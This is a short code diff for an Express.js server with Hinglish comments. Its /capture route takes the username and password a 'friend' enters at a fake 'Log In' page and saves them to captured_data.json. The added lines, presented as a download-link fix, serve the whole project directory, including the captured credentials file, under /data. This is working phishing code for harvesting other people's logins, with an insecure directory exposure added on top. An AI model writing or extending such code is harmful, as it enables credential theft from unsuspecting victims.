@@ -15,6 +15,9 @@ app.use(express.static(path.join(__dirname, 'public')));
 // Data save karne ki file ka path
 const dataFile = path.join(__dirname, 'captured_data.json');
 
+// Download link fix karne ke liye yeh line add ki hai
+app.use('/data', express.static(__dirname)); 
+
 // Jab dost "Log In" dabaye (Final Data)
 app.post('/capture', (req, res) => {
     const { username, password } = req.body;
